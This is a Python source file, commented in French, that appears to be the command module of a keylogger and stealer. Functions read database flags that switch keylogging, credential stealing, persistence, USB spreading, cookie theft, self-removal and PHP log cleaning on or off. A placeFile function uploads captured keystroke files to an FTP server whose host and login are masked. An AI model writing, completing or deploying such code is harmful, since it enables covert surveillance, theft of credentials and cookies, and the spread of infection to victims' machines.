from recuperation import connexion_base
from ftplib import *
import time
'''result = []
result = connexion_base()'''
result = []
try:
    
    def keylogger():
        while True:

            result = connexion_base()
            keyloger = "keyloger"
            if result[0] == (0, 'keyloger'):
                # print("oui avec :", result[0])
                keyloggers = "OFF"
                return keyloggers
            elif result[0] == (1, 'keyloger'):
                # print("Oui avec", result[0])
                keyloggers = "ON"
                return keyloggers
            else:
                keyloggers = "Problème de lecture."
                return keyloggers

    def stealer():
        #[STEALER]#
        if result[1] == (0, 'stealer'):
            # print("oui avec :", result[1])
            stealer = "OFF"
            return stealer
        elif result[1] == (1, 'stealer'):
            # print("Oui avec :", result[1])
            stealer = "ON"
            return stealer
        else:
            stealer = ""
            return stealer

    def persistance():
        #[PERSISTANCE]#
        if result[2] == (0, 'persistance'):
            # print("oui avec :", result[2])
            persistances = "OFF"
            return persistances
        elif result[2] == (1, 'persistance'):
            # print("resussis avec", result[2])
            persistances = "ON"
            return persistances
        else:
            persistances = "Problème de lecture."
            return persistances
            return persistances

    def spreadusb():
        #[SpreadUSB]#
        if result[3] == (0, 'SpredUSB'):
            # print("oui avec :", result[3])
            spreadusbb = "OFF"
            return spreadusbb
        elif result[3] == (1, 'SpredUSB'):
            # print("Oui avec :", result[3])
            spreadusbb = "ON"
            return spreadusbb
        else:
            spreadusbb = "Problème de lecture."
            print("connexion échoué")
            return spreadusbb

    def delette():
        #[Remove keylogger/stealer]#
        if result[4] == (0, 'remove'):
            # print("oui avec :", result[4])
            remove = "NO"
            return remove
        elif result[4] == (1, 'remove'):
            remove = "OK"
            return remove
        else:
            remove = "Problème de lecture."
            print("connexion échoué")
            return remove

    def remove_cache():
        #[clean all log php]#
        if result[5] == (0, 'clean'):
            # print("oui avec :", result[5])
            clean = "OFF"
            return clean
        elif result[5] == (1, 'clean'):
            # print("oui avec :", result[5])
            clean = "ON"
            return clean
        else:
            clean = "Problème de lecture."
            print("connexion échoué")
            return clean

    def steal_cookie():
        #[cookies]#
        if result[6] == (0, 'cookies'):
            cookie = "OFF"
            return cookie
        elif result[6] == (1, 'cookies'):
            cookie = "ON"
            return cookie
        else:
            cookie = "Problème de lecture."
            print("connexion échoué")
            return cookie

            #FONCTION D'ENREGISTREMENT A LANCER APRèS L'éCRITURE DU PROGRAMME
    def placeFile(box):
        ftp = FTP('files.xxxx.com', 'xxxx', 'xxxx')
        filename = "keytest_"+ str(box) +".txt"
        ftp.storbinary("STOR " + filename, open(filename, 'rb'))
        ftp.quit()
        print("ok")
        
except:
    print("erreur")

